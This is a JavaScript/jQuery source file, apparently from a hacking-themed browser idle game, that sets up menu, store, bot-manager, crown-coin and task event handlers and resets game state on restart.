      opne_makesure("ad_dps2")
    else if(Game.impermanent.g_eff.ad_data == 4)
    	opne_makesure("ad_dps4")
  }
  else
  	opne_makesure("ad_gift")
}

$(document).ready(function() {
	create_savefile_row()

	//set main menu three btns
	$("#new_game_btn").on("click", ()=> {
		new_game()
	})
	$("#login_btn").on("click", ()=> {
		showlogInView()
		reset_latplayed()
	})
	$("#import_btn").on("click", ()=> {
		showImportView()
		$('#importData').val('')
	})

	//set game_version_txt
	$("#game_version_txt").html("VERSION: "+Game.VERSION+"<br> Game by: @MangoFlavor")
	$("#game_version_txt").removeClass("loading_txt_anim")

	$('#loading_anim').addClass("loading_anim_div")
	$('#loading_anim').css("display", "flex")
	$('#loading_anim').on("animationend webkitAnimationEnd oAnimationEnd MSAnimationEnd", function() {
    $(this).css('display', 'none')
    $("#login_reg_section").css('display', 'flex')
    $("#main_menu_log").html("Welcome")
	})

	$("#gaia_sobatage_timer_bg").on("mouseenter", function() {
		if(Game.impermanent.threat < 100) {
			$("#effects_card").css("display", "flex")
			onhover_g_eff()
		}
	})

	$("#gaia_sobatage_timer_bg").on("mouseleave", function() {
		if(!g_eff_clicked)
			$("#effects_card").css("display", "none")
	})

	$("#gaia_sobatage_timer_bg").on("click", function() {
		if(g_eff_clicked) {
			g_eff_clicked = false
			$("#g_eff_timer").css("border", "none")
			$("#effects_card").css("display", "none")
		}
		else {
			g_eff_clicked = true
			$("#g_eff_timer").css("border", "2px solid var(--selectClr)")
			$("#effects_card").css("display", "flex")
		}
	})

	//Hack enter btn
	$("#gaia_input_enter").on("click", function() {
    getInput("Enter")
	})

	$(".ad_multi_btn").on("click", function() {
		ad_btn = this.id
		click_ad_btn(ad_btn)
	})

	//zoom in/out in format manu
	$(".zoom_btn").on("click", function(e) {
		if(this.id == "zoom_in") {
			format_zoom += 0.1;
			if(format_zoom >= 1) format_zoom = 1
			$("#nodes_container").css("transform", "scale("+format_zoom+")");
		}
		else {
			format_zoom -= 0.1;
			if(format_zoom <= 0.3) format_zoom = 0.3
			$("#nodes_container").css("transform", "scale("+format_zoom+")");
		}
	})

	//system manager
	$(".system_btn").on("click", function() {
		sys_oldpage = sys_newpage.replace("_btn", "")
		sys_newpage = this.id.replace("_btn", "")

		$("#"+sys_oldpage+"_btn").css("border", "1px solid var(--mainClr)")
		$("#"+sys_newpage+"_btn").css("border", "1px solid var(--selectClr)")
		$("#"+sys_oldpage).css("display", "none")
		$("#"+sys_newpage).css("display", "flex")

		if(sys_newpage == "details") 
		update_details()
		else if(sys_newpage == "performance") {
			$("#perf_res_cpu_btn").click()
			update_current_performance()
		}
	})

	$(".performance_res_btns").on("click", function() {
		sys_oldperf = sys_newperf
		sys_newperf = this.id
		$("#"+sys_oldperf).css("border", "1px solid var(--mainClr)")
		$("#"+sys_newperf).css("border", "1px solid var(--selectClr)")

		update_current_performance()
	});

	$("#softwares").on("mouseenter", ".sys_software_top_icon", function() {
		softoldsel = softnewsel
		softnewsel = this.id
		hover_sys_software_icons(softnewsel)
	});

	//open menu
	$(".menu_btns_section").on("click", ".menu_btn", function() {
		if(this.id !== "exit_btn" && this.id !== "save_btn" && this.id !== "world_map_btn") {
			oldmenu = newmenu
			newmenu = this.id
			oid = oldmenu.replace("_btn", '')
			nid = newmenu.replace("_btn", '')
			$("#"+oid+"_menu").css('display', 'none')
			$("#"+nid+"_menu").css('display', 'flex')
			title = nid.replace(/_/g, ' ')
			title = title.charAt(0).toUpperCase()+title.slice(1)
			$("#main_screen_title").text(title)

			if(oldmenu == "achievements_btn") {
				for(let i = 0; i < a_glow_anim.length; i++) {
					$(a_glow_anim[i]).removeClass("achievements-glow")
					a_glow_anim.shift()
					i--
				}
				onclose_a_menu_bonus_cps = Game.permanent.achievementsMulti
				added_a_bonus_cps = 0
				$("#achievements_bounes").html("CPS bonus: "+simplifyNumber(Game.permanent.achievementsMulti*100)+"%")
			}

			if(newmenu == "achievements_btn")
				Events["OPEN_ACHIEVEMENTS"]()
			else if(newmenu == "system_manager_btn")
				$("#processes_btn").click()
			else if(newmenu == "store_btn") {
				$("#hq_btn").click()
			}
			else if(newmenu == "bot_manager_btn")
				$("#warehouse").click()
			else if(newmenu == "format_btn") {
				checK_node_price()
				Events["OPEN_FORMAT"]()
			}
		}
	})

	//click on clicker
	$("#clicker").click(function(e) {
		c_text = $("#click_txt")
		c_text.removeClass('click_text_flaot')
		//$("#click_txt").outerHeight()
		increase_credit(click_total)
		Game.permanent.total_credit_from_clicks += click_total
		Game.permanent.total_clicks++
		Observer["CLICK_ON_CONSOLE"]()
		c_text.text("+"+simplifyNumber(click_total))
		c_text.css("top", e.pageY - $("#clicker").offset().top-20)
		c_text.addClass('click_text_flaot')
	})

	//Resume/pause Tasks
	$(".rewards_reset_btn").on("click", function() {
		id = this.id
		if(id == "task_toggle") {
			toggle_task()
		}
	})

	//Reset Tasks
	$("#task_reset").on("click", function() {
		Game.impermanent.tasks_rewards.tier_1.collected = true
		Game.impermanent.tasks_rewards.tier_2.collected = true 
		Game.impermanent.tasks_rewards.tier_3.collected = true
		Game.impermanent.tasks_rewards.tier_4.collected = true
		Game.impermanent.tasks_rewards.tier_5.collected = true
		reset_contribution_rewards()
	})

	$("#tasks_section").on("mouseenter", ".task_card", function() {
		onhover_tasks_info_element(this.id)
		$("#task_info_card").css("display", "flex")
	});

	$("#tasks_section").on("mouseleave", ".task_card", function() {
		$("#task_info_card").css("display", "none")
	});

	$(".tasks_types_seciton").on("click", ".tasks_type_btn", function() {
		moldsel = mnewsel
		mnewsel = this.id
		task = mnewsel
		setActiveTask()
		activeTask()
	});

	$(".tasks_btns_seciton").on("click", ".tasks_btn", function() {
		$("#"+difficulty).css("border", "")
		difficulty = this.id
		$("#"+difficulty).css("border", "1px solid var(--selectClr)")
		setActiveTask()
		activeTask()
	});

	$(".rewards_block").on("click", function() {
		id = this.id;
		if(id == "tier_1") {
			rewards_block_click(10, id, increase_credit, Game.impermanent.tasks_rewards[id].reward, simplifyNumber, "Credit")
			reset_contribution_rewards()
		}
		else if (id == "tier_2") {
			rewards_block_click(25, id, increase_credit, Game.impermanent.tasks_rewards[id].reward, simplifyNumber, "Credit")
			reset_contribution_rewards()
		}
		else if (id == "tier_3") {
			rewards_block_click(40, id, increase_data, Game.impermanent.tasks_rewards[id].reward, get_data_with_symbol, "Data")
			reset_contribution_rewards()
		}
		else if (id == "tier_4") {
			rewards_block_click(55, id, increase_credit, Game.impermanent.tasks_rewards[id].reward, simplifyNumber, "Credit")
			reset_contribution_rewards()
		}
		else if (id == "tier_5") {
			rewards_block_click(100, id, increase_data, Game.impermanent.tasks_rewards[id].reward, get_data_with_symbol, "Data")
			reset_contribution_rewards()
		}
	})

	//hover quick info element
	$("#quick_info").on("mouseenter", ".quick_card", function() {
		onhover_quick_info_element(this.id)
		$("#quick_info_card").css("display", "flex")
	})

	$("#quick_info").on("mouseleave", ".quick_card", function() {
		$("#quick_info_card").css("display", "none")
	})
	

	$(".h_s_btn").on("click", function() {
		h_s_osel = h_s_nsel
		h_s_nsel = this.id

		$("#"+h_s_osel).css("box-shadow", "none")
		$("#"+h_s_nsel).css("box-shadow", "inset 0px 0px 5px var(--selectClr)")

		$("#"+h_s_osel+"_view").css("display", "none")
		$("#"+h_s_nsel+"_view").css("display", "flex")

		if(h_s_nsel == "s_section") {
			$("#new_s").css("display", "none")
			new_s_num = 0
			check_s_item_price()
		}
		else {
			for(i = 0; i < new_s_anim.length; i++) {
				$("#"+new_s_anim[i]).removeClass("achievements-glow")
			}
			new_s_anim = []
			check_h_item_price()
		}
	})

	$("#h_items").on("mouseenter", ".h_s_item", function() {
		item_oldsel = item_newsel
		item_newsel = this.id

		$("#"+item_oldsel).css("border-color", $("#"+item_oldsel).attr("data-color"))
		$("#"+item_newsel).css("border-color", "var(--selectClr)")

		$("#item_info_card").css("display", "flex")
		
		h_items_hover()
	})

	$("#h_items").on("mouseleave", ".h_s_item", function() {
		$("#"+item_newsel).css("border-color", $("#"+item_newsel).attr("data-color"))
		$("#item_info_card").css("display", "none")
	})

	//choose hardware buy bundle
	$("#h_menu_bundle_btns").on("click", ".h_btn", function() {
		h_bundle_old = h_bundle_new
		h_bundle_new = this.id
		switch(h_bundle_new) {
		case "h_bundle_1":
			h_bundle = 1
			break
		case "h_bundle_5":
			h_bundle = 5
			break
		case "h_bundle_10":
			h_bundle = 10
			break
		case "h_bundle_25":
			h_bundle = 25
			break
		case "h_bundle_50":
			h_bundle = 50
			break
		case "h_bundle_100":
			h_bundle = 100
			break
		}
		set_hardware_prices()
		check_h_item_price()
		$("#"+h_bundle_old).css("border", "1px solid var(--mainClr)")
		$("#"+h_bundle_new).css("border", "1px solid var(--selectClr)")
		log("<br> > Changed Hardware buy mode to &times;"+h_bundle+" piece", "sys")
	})

	//when (buying) hardware items
	$("#h_items").on("click", ".h_s_item", function() {
		hardware_items_click($("#"+item_newsel+" > p").attr("id"))
	})

	$("#s_items").on("mouseenter", ".h_s_item", function() {
		item_oldsel = item_newsel
		item_newsel = this.id
		$("#"+item_oldsel).css("border-color", "var(--mainClr")
		$("#"+item_newsel).css("border-color", "var(--selectClr)")

		$("#item_info_card").css("display", "flex")
		
		s_items_hover()
	})

	$("#s_items").on("mouseleave", ".h_s_item", function() {
		$("#"+item_newsel).css("border-color", "var(--mainClr)")
		$("#item_info_card").css("display", "none")
	})

	//when (buying) softwares items
	$("#s_items").on("click", ".h_s_item", function() {
		software_items_click()
	})


	//click achievements icon
	$("#achievements_icons").on("click", ".achievements_icons", function() {
		click_achievement(this.id)
	});

	//hover achievements text in console
	$("#log_text").on("mouseenter", ".achievements_card", function() {
		onhover_achievement_info(this.id)
		$("#achievements_info_card").css("display", "flex")
	})

	$("#log_text").on("mouseleave", ".achievements_card", function() {
		$("#achievements_info_card").css("display", "none")
	})

	//store
	$(".store_btn").on("click", function() {
		change_page = false
		page = ""
		display = ""

		if(this.id == "ol_btn") {
			if(Game.impermanent.ol_unlocked) {
				change_page = true
				page = "ol_items_list"
				display = "grid"
				soldsel = snewsel
				snewsel = this.id
				Events["STORE_OL"]()
				click_ol_btn()
			}
			else {
				log('<br>> '+con_span("HQ: ", "var(--hqClr)")+'Unable to connect to "Online Store', "hq")
				log('<br>> '+con_span("HQ: ", "var(--hqClr)")+'you need at least 1 Router installed', "hq")
			}
		}
		else {
			soldsel = snewsel;
			snewsel = this.id;
			if(snewsel == "hq_btn") {
				change_page = true
				page = "hq_items_list"
				display = "flex"
				Events["STORE_HQ"]()
				click_hq_btn()
			}
			else if(snewsel == "dl_btn") {
				change_page = true
				page = "dl_items_list"
				display = "flex"
				click_dl_btn()
			}
			else if(snewsel == "ol_details_btn") {
				change_page = true
				page = "ol_details"
				display = "flex"
				click_ol_details_btn()
			}
		}

		if(change_page) {
			$("#"+soldsel).css("border", "1px solid var(--mainClr)")
			$("#"+snewsel).css("border", "1px solid var(--selectClr)")
			$("#hq_items_list").css("display", "none")
			$("#ol_items_list").css("display", "none")
			$("#dl_items_list").css("display", "none")
			$("#ol_details").css("display", "none")

			$("#"+page).css("display", display)
		}
	})

	//choose HQ items buy bundle
	$(".store_hq_bundle_btns_div").on("click", ".store_hq_bundle_btn", function() {
		hq_bundle_old = hq_bundle_new
		hq_bundle_new = this.id
		switch(hq_bundle_new) {
		case "hq_bundle_1":
			hq_bundle = 1
			break
		case "hq_bundle_5":
			hq_bundle = 5
			break
		case "hq_bundle_10":
			hq_bundle = 10
			break
		case "hq_bundle_25":
			hq_bundle = 25
			break
		}
		set_hq_store_item_price(hq_bundle)
		set_hqStore_items()
		check_hqStore_item_price()
		$("#"+hq_bundle_old).css("border", "1px solid var(--mainClr)")
		$("#"+hq_bundle_new).css("border", "1px solid var(--selectClr)")
		log("<br> > Changed HQ store buy mode to &times;"+hq_bundle+" piece", "sys")
	});

	//Buy in HQ store
	$(".hq_btn_slct").click("click", function() {
		buy_hq_items(this.id);
	});

	//Buy in OL store
	$(".ol_btn_slct").on("click", function(e) {
		index = parseInt(this.id.split('_i')[1])
		if(Game.impermanent.ol_items[index] == undefined)
				return
		buy_ol_item(index)
		check_onlineStore_item_price()
	})

	//bot manager
	$(".bot_btn").on("click", function() {
			bot_mene_old = bot_mene_new
			bot_mene_new = this.id

			$("#"+bot_mene_old).css("border", "1px solid var(--mainClr)")
			$("#"+bot_mene_new).css("border", "1px solid var(--selectClr)")
			$("#"+bot_mene_old+"_view").css("display", "none")
			$("#"+bot_mene_new+"_view").css("display", "flex")

			if(bot_mene_new == "warehouse")
				Events["BOT_WHEREHOUSE"]()
			else if(bot_mene_new == "assemble")
				Events["BOT_ASSEMBLE"]()
			else if(bot_mene_new == "production")
				Events["BOT_PRODUCTION"]()
			else if(bot_mene_new == "procedure")
				Events["BOT_PROCEDURE"]()
	})

	$("#assemble_view_action").on("mouseenter", ".bot_card", function() {
		bot_old = bot_new
		bot_new = this.id
		hover_bot_item(bot_new)
	})

	$("#assemble_view_action").on("click", ".bot_card", function() {
		click_bot_item(bot_new)
	})
	
	$("#production_view_action").on("mouseenter", ".bot_production_card", function() {
		bot_old = bot_new
		bot_new = this.id
		$("#"+bot_old).css("border", "1px solid var(--mainClr)")
		$("#"+bot_new).css("border", "1px solid var(--selectClr)")

		$("#production_name").text(production_data[bot_new].name)
		$("#production_des").text(production_data[bot_new].des.replace("/e", Game.permanent[bot_new+"_base_effect"]))

		bot_assign_old = bot_assign_new
		bot_assign_new = $("#"+bot_new+" .bot_production_card_action_row_list_card:first").attr('id')

		$("#"+bot_assign_old).css({
			"border": "1px solid var(--mainClr)",
			"box-shadow": "none"
		})
		$("#"+bot_assign_new).css({
			"border": "1px solid var(--selectClr)",
			"box-shadow": "inset 0px 0px 10px var(--selectClr)"
		})
	})

	$("#procedure_view_action").on("mouseenter", ".bot_procedure_card", function() {
		bot_old = bot_new
		bot_new = this.id
		$("#"+bot_old).css("border", "1px solid var(--mainClr)")
		$("#"+bot_new).css("border", "1px solid var(--selectClr)")

		$("#procedure_name").text(procedure_data[bot_new].name)
		$("#procedure_des").text(procedure_data[bot_new].des.replace("/e", Game.permanent[bot_new+"_base_effect"]+"%"))

		bot_assign_old = bot_assign_new
		bot_assign_new = $("#"+bot_new+" .bot_production_card_action_row_list_card:first").attr('id')


		$("#"+bot_assign_old).css({
			"border": "1px solid var(--mainClr)",
			"box-shadow": "none"
		})
		$("#"+bot_assign_new).css({
			"border": "1px solid var(--selectClr)",
			"box-shadow": "inset 0px 0px 10px var(--selectClr)"
		})
	})

	$(".bot_production_card_action_row_list_card").on("click", function() {
		bot_assign_old = bot_assign_new
		bot_assign_new = this.id

		$("#"+bot_assign_old).css({
			"border": "1px solid var(--mainClr)",
			"box-shadow": "none"
		})
		$("#"+bot_assign_new).css({
			"border": "1px solid var(--selectClr)",
			"box-shadow": "inset 0px 0px 10px var(--selectClr)"
		})
	})
	

	$(".assign").on("click", function() {
		assign_bot(this.id)
	})
	
	$(".withdraw").on("click", function() {
		withdraw_bot(this.id)
	})

	//click on crown coin
	$("#crown_coin").on("click", function(e) {
		$("#crown_coin_eff").remove()
		$(".main").append('<p id="crown_coin_eff" class="crown_coin_text"></p>')
		e_text = $("#crown_coin_eff")
		Game.permanent.total_crown_coin_collected++
		//set effect
		coin_type = ranged_random(3, 1)
		coin_level = weightedRandom(3, 1)
		des_text = ""

		multi_name = ""
		visual_id = ""
		coin_eff = 0
		des = ""
		eff_multi = 1+Game.impermanent.crown_effect_multi
		dr = formatTimeMinute(crown_coin_duration)

		switch(coin_level) {
			case 1:
				des_text = "<span style='color: gold;'>Basic</span> Crown Coin found, "
				des = "Basic"
				break
			case 2:
				des_text = "<span style='color: gold; text-shadow: 0px 0px 7px gold'>Uncommon</span> Crown Coin found, "
				des = "Uncommon"
				break
			case 3:
				if(CGEnvironment)
					window.CrazyGames.SDK.game.happytime()
				des_text = "<span style='color: gold; text-shadow: 0px 0px 30px gold'>Rare</span> Crown Coin found, "
				des = "Rare"
				break
		}
		des += " Crwon coin effect<br>"
		//cps multi
		switch(coin_type) {
		case 1:
			multi_name = "coin_credit"
			visual_id = "q_cps"
			switch(coin_level) {
			case 1:
				coin_eff = Math.floor(ranged_random(33, 77)*eff_multi)
				break
			case 2:
				coin_eff = Math.floor(ranged_random(114, 222)*eff_multi)
				break
			case 3:
				coin_eff = Math.floor(ranged_random(333, 777)*eff_multi)
				break
			}
			log("<br>> "+des_text+"CPS x"+coin_eff+" for "+dr, "sys")
			e_text.text("CPS x "+coin_eff)
			des += " CPS x"+coin_eff
			break
		//dps multi
		case 2:
			multi_name = "coin_data"
			visual_id = "q_dps"
			switch(coin_level) {
			case 1:
				coin_eff = Math.floor(ranged_random(18, 33)*eff_multi)
				break
			case 2:
				coin_eff = Math.floor(ranged_random(55, 88)*eff_multi)
				break
			case 3:
				coin_eff = Math.floor(ranged_random(128, 333)*eff_multi)
				break
			}	
			log("<br>> "+des_text+"DPS x"+coin_eff+" for "+dr, "sys")
			e_text.text("DPS x "+coin_eff)
			des += " DPS x"+coin_eff
			break
		//click multi
		case 3:
			multi_name = "coin_click"
			visual_id = "clicker"
			switch(coin_level) {
			case 1:
				coin_eff = Math.floor(ranged_random(33, 55)*eff_multi)
				break
			case 2:
				coin_eff = Math.floor(ranged_random(88, 124)*eff_multi)
				break
			case 3:
				coin_eff = Math.floor(ranged_random(222, 444)*eff_multi)
				break
			}
			log("<br>> "+des_text+"Clicks x"+coin_eff+" for "+dr, "sys")
			e_text.text("Clicks x "+coin_eff)
			des += " Clicks x"+coin_eff
			break;
		}

		//show eff text
		e_text.css({
			"text-shadow": "0px 0px "+coin_level*10+"px #FFD700",
	    "z-index": 1000,
	    "top": e.pageY
	  });

	  e_text.addClass("animated_text_crown")
	  
		if(e.pageX+e_text.width() > $(window).width())
			e_text.css("left", e.pageX-(e.pageX+e_text.width()-$(window).width()))
		else
			e_text.css("left", e.pageX)

		//clear hide anim timeout, hide coin
		$("#crown_coin").removeClass("crown_coin_anim")
		$("#crown_coin").css("display", "none")
		
		des += " for /e"
		generate_effect(crown_coin_duration, multi_name, "-", "+", visual_id, "coin", coin_eff, des, 1)
	})

	create_nodes_view()
	$("#format_menu").css("display", "none")

	//Assets are loaded
	if(CGEnvironment) {
		//check if ad blocker is active
		window.CrazyGames.SDK.ad.hasAdblock(adblocker_callback)
		window.CrazyGames.SDK.game.sdkGameLoadingStop();
	}
})

function show_Welcome_view() {
	$(".main").css("display", "flex")
	$("#Welcome").css("display", "flex")
	$("#register").css('display', 'none')
	$("#login").css("display", "none")
	$("#import").css('display', 'none')
	$("#main_menu_log").text("Welcome")
	$("#main_menu_log").css("color", "var(--mainClr)")
	cancel_delete()
}

function restart_game(withloading) {
	isLogin = false
	//remove all current effects visuals
	for(i = 0; i < Game.impermanent.g_eff.effects.length; i++) {
		remove_view_multi_state(i)
	}

	cancel_format()

	if(isFormatting) {
		temp = Game.impermanent.g_eff.effects.filter(obj => obj.multi_name === 'ad_credit' || obj.multi_name === 'ad_data')
		ad_d = Game.impermanent.g_eff.ad_data
		ad_c = Game.impermanent.g_eff.ad_credit 
		Game.impermanent = deepCopy(ORIGINAL_DATA.impermanent)
		Game.impermanent.g_eff.effects = temp
		Game.impermanent.g_eff.ad_data = ad_d
		Game.impermanent.g_eff.ad_credit = ad_c
	}

	//save
	if(!modify_acc) {
		Game.impermanent.game_close_time = new Date().getTime()
		UpdateSave()
	}

	//stop game, clear all current timeouts
	stop_game()

	$("#crown_coin").removeClass("crown_coin_anim")
	$("#crown_coin").css("display", "none")
	$("#crown_coin_eff").remove()

	//clear menus that generate its content
	//hardware/software items
	$("#h_items").empty()
	$("#s_items").empty()
	$("#h_section").click()
	$("#new_s").css("display", "none")
	$("#h_bundle_1").click()
	//store
	soldsel = snewsel
	snewsel = "hq_btn"
	$("#"+soldsel).css("border", "1px solid var(--mainClr)")
	$("#"+snewsel).css("border", "1px solid var(--selectClr)")
	$("#hq_items_list").css("display", "flex")
	$("#ol_items_list").css("display", "none")
	$("#dl_items_list").css("display", "none")
	$("#ol_details").css("display", "none")
	$("#dl_items_list").empty()
	$("#hq_bundle_1").click()
	//achievements
	$(".achievements_icons_group").empty()
	//console
	$("#log_text").text("")	
	$("#g_eff_timer_txt").text("")
	//sys manager
	sys_oldpage = sys_newpage.replace("_btn", "")
	sys_newpage = "processes"

	$("#"+sys_oldpage+"_btn").css("border", "1px solid var(--mainClr)")
	$("#"+sys_newpage+"_btn").css("border", "1px solid var(--selectClr)")
	$("#"+sys_oldpage).css("display", "none")
	$("#"+sys_newpage).css("display", "flex")
	//bot manager
	bot_mene_old = bot_mene_new
	bot_mene_new = "warehouse"
	$("#"+bot_mene_old).css("border", "1px solid var(--mainClr)")
	$("#"+bot_mene_new).css("border", "1px solid var(--selectClr)")
	$("#"+bot_mene_old+"_view").css("display", "none")
	$("#"+bot_mene_new+"_view").css("display", "flex")
	
	$("#menus_sel_locked").css("display", "none")
	$("#tasks_section_locked").css("display", "none")
	$("#g_eff_timer_locked").css("display", "none")
	$("#console_locked").css("display", "none")
	$("#quick_info_locked").css("display", "none")
	$("#h_s_container_locked").css("display", "none")
	$("#format_dps").css("display", "none")

	$("#"+newmenu.replace("_btn", '')+"_menu").css('display', 'none')
	$("#main_screen_title").text("")
	//sustem manager
		//softwares
  $("#sys_s_item_name").text("")
	$("#sys_s_item_effect").html("")
	$("#sys_s_installed").html("")
	$("#sys_s_item_cpu").text("0%")
	$("#sys_s_item_gpu").text("0%")
	$("#sys_s_item_ram").text("0MB")
	$("#sys_s_item_fan").html("0&#8451;")
	$("#sh1_eff").text("")
	$("#sh2_eff").text("")
	$("#sh3_eff").text("")
	$("#sh4_eff").text("")
	$("#sh5_eff").text("")
	$("#sh6_eff").text("")
	$("#sh7_eff").text("")
	$("#sh8_eff").text("")
	$("#sh9_eff").text("")
	$("#sh10_eff").text("")
	$("#sh11_eff").text("")
	$("#sh12_eff").text("")
	$("#sc_eff").text("")
	$("#scp_eff").text("")
	$("#spt_eff").text("")
	$("#smt_eff").text("")
	$("#scm_eff").text("")
	$("#sf_eff").text("")
	$("#sag_eff").text("")
	$("#sog_eff").text("")
	$("#sng_eff").text("")
	$("#snag_eff").text("")
	$("#snrg_eff").text("")
	$("#sxg_eff").text("")
	$("#snxg_eff").text("")
	$("#sadv_eff").text("")
	$("#smthr_eff").text("")
	$("#sdpsm1_eff").text("")
	$("#sdpsm2_eff").text("")
	$("#sdpsm3_eff").text("")
	$("#sfw_eff").text("")
	$("#scr_eff").text("")
	$("#sbm_eff").text("")
	$("#ssm_eff").text("")
		//processes
  $("#processes_app_table_body").empty()
  $("#processes_bg_table_body").empty()
  $(".sys_software_group").empty()
  //bot manager
  $("#warehouse_group_0").empty()
	$("#warehouse_group_1").empty()
	$("#warehouse_group_2").empty()

	//auto icons
	$("#auto_install_icon").remove()
	$("#auto_block_icon").remove()

	//make sure to close all opened menus
	$("#make_sure").css("display", "none")
	$("#idle_hiber_report").css("display", "none")
	$("#updates_menue").css("display", "none")

	//reset views
	$('#login_table_body').children().each(function(index, element) {
		$(element).css("box-shadow", "")
	})

	$("#ad_cps_can").css("display", "flex")
	$("#ad_dps_can").css("display", "flex")
	$("#ad_cps_max").css("display", "none")
	$("#ad_dps_max").css("display", "none")
	$("#ad_gift_timer").css("display", "none")

	//system color to green
	document.documentElement.style.setProperty("--sys_stroke_clr", "#81ce77")
	document.documentElement.style.setProperty("--sys_fill_clr", "#477547")
	document.documentElement.style.setProperty("--mainBackgroundClr", "#0e2409")
	document.documentElement.style.setProperty("--mainClr", "#6bbd54")
	document.documentElement.style.setProperty("--secondClr", "#213e15")
	document.documentElement.style.setProperty("--backgroundClr", "#133003")
	document.documentElement.style.setProperty("--hoverClr", "#1b5b01")
  document.documentElement.style.setProperty("--table_head", "#274a26")
	document.documentElement.style.setProperty("--table_stripe", "#051a02")
	document.documentElement.style.setProperty("--selectClr", "#c7c197")
	document.documentElement.style.setProperty("--positiveClr", "#6bbd54")
	document.documentElement.style.setProperty("--negativeClr", "#f44336")
	document.documentElement.style.setProperty("--blockedClr", "#c7c197")
	document.documentElement.style.setProperty("--olRefreshClr", "#a400e6")
	document.documentElement.style.setProperty("--hqClr", "#c8c8c8")
	document.documentElement.style.setProperty("--gaiaClr", "#ed7e07")
	document.documentElement.style.setProperty("--golden", "#FFD700")
	document.documentElement.style.setProperty("--def_curr", "#133003")
	document.documentElement.style.setProperty("--def_solv", "#403604")
	document.documentElement.style.setProperty("--def_fail_high", "#f4433640")
	document.documentElement.style.setProperty("--def_fail_low", "#1f1f1f40")

	//show main menu
	show_Welcome_view()
	$("#main_manu_view").css("display", "flex")
	//make sure to reset main three button, if this is the first reset after New Game
	$("#new_game_btn").off("click").on("click", ()=> {
		new_game()
	})
	$("#login_btn").off("click").on("click", ()=> {
		showlogInView()
		reset_latplayed()
	})
	$("#import_btn").off("click").on("click", ()=> {
		showImportView()
		$('#importData').val('')
	})
	$("#new_game_btn").css("filter" , "brightness(1)")
	$("#login_btn").css("filter" , "brightness(1)")
	$("#import_btn").css("filter" , "brightness(1)")
	if(withloading) {
		$("#login_reg_section").css("display", "none")
		$("#main_menu_log").text("")
		$('#loading_anim').removeClass("loading_anim_div")
		$('#loading_anim').addClass("loading_anim_div")
		$('#loading_anim').css("display", "flex")
	}
	else {
		$('#Welcome').css("display", "flex")
	}

	//reset variables that are not in Game object to intial state
	timers_IDs = []
	new_s_num = 0

	isFormatting = false
	//g_eff_timer
	g_eff_t_isruniing = false
	g_eff_timer = 0
	g_eff_clicked = false

	//makesure
	makesure = ""

	//settings
	modify_acc = false

	//attack
	is_attack = false
	//time
	time = 0
	active_clock = 0
	session_time = 0
	time_diff = 0

	//console
	cnsl_all = []

	//ad
	ad_btn = ""

	//achievements
	total_credit_in_one_session = 0
	total_data_in_one_session = 0
	total_materials_in_one_session = 0

	//menu selection
	oldmenu = "system_manager_menu"
	newmenu = "system_manager_menu"
	old_main_icon = "hardware_menu_icon"
	new_main_icon = "hardware_menu_icon"
	//items selection
	item_oldsel = "h1"
	item_newsel = "h1"
	s_oldsel = "s1h1"
	s_newsel = "s1h1"
	s_mouseX = 0
	s_mouseY = 0
	c_mouseX = 0
	c_mouseY = 0
	clicked = ""

	//hardware menu selection
	h_bundle_old = "h_bundle_1"
	h_bundle_new = "h_bundle_1"
	h_bundle = 1
	h_s_osel = "h_section"
	h_s_nsel = "h_section"

	//task selection
	moldsel = "task1"
	mnewsel = "task1"
	task_isPauseed = false

	//sys selection
	sysoldsel = "res_btn"
	sysnewsel = "res_btn"

	//store menu
	hq_bundle_old = "hq_bundle_1"
	hq_bundle_new = "hq_bundle_1"
	hq_bundle = 1

	//bot menu
	bot_old = "suppoer_1"
	bot_new = "suppoer_1"
	bot_assign_old = "scrapping1"
	bot_assign_new = "scrapping1"

	//zoom in/out forman menu
	format_zoom = 1

	hack_animation_start = 0
	tW_ctr = 0
	tW_ctr_id = 0

	added_a_bonus_cps = 0
	onclose_a_menu_bonus_cps = 0
	a_glow_anim = [""]

 	bot_sel = ""
 	mtrls_timer = 60

 	data = 0
 	lastID= 0
 	isCreated = false
	temp_format_data_learned = []
	temp_used_data = 0
	temp_format_cps_multi = 0

	h_marks_index_achiv = {
		h1: 0,
		h2: 0,
		h3: 0,
		h4: 0,
		h5: 0,
		h6: 0,
		h7: 0,
		h8: 0,
		h9: 0,
		h10: 0,
		h11: 0,
		h12: 0
	}
	h_marks_index_soft = {
		h1: 1,
		h2: 1,
		h3: 1,
		h4: 1,
		h5: 1,
		h6: 1,
		h7: 1,
		h8: 1,
		h9: 1,
		h10: 1,
		h11: 1,
		h12: 1
	}
	t_hw_m_index = 0
	thr_m_index = 0
	bm_m_index = 0
	t_sw_index = 0
	adv_dcd_index = 0
	d_f_index = 0
	d_a_index = 0
	d_s_index = 0
	sw_m_index = 0
	f_w_index = 0
	t_ol_p_index = 0
	t_c_f_c_index = 0
	t_c_index = 0
	t_d_index = 0
	t_c_g_index = 0
	t_d_in_session = 0
	t_c_in_one_s_index = 0
	c_c_index = 0,
	t_c_s_index = 0
	h_cps_index = 0
	h_dps_index = 0
	c_index = 0
	c_p_index = 0
	cps_m_index = 0
	t_t_p_index = 0
	t_t_c_index = 0
	t_c_f_t_index = 0
	t_d_f_t_index = 0
	p_t_c_index = 0
	t_p_t_c_index = 0
	a_t_c_index = 0
	t_a_t_c_index = 0
	s_t_c_index = 0
	t_s_t_c_index = 0

	selected_File = ""
	oldselected_File = ""
	confirm_del = false
	imported_file = ""

	sys_color_old_btn = "sysgreen"
	sys_color_new_btn = "sysgreen"

	sys_oldperf = "perf_res_cpu_btn"
	sys_newperf = "perf_res_cpu_btn"
	softoldsel
	softnewsel = ""

	//for fake cerificate
	curr_fc_charAt = 0
	difficulty = "Easy"
	next_keyToBePressed = keyName[ranged_random(25,0)]

	//reset Game object to make sure not openning old one
	Game = deepCopy(ORIGINAL_DATA);

	//Assets should be loaded
	if(CGEnvironment) {
		//check if ad blocker is active
		window.CrazyGames.SDK.ad.hasAdblock(adblocker_callback)
		window.CrazyGames.SDK.game.sdkGameLoadingStop()
	}
}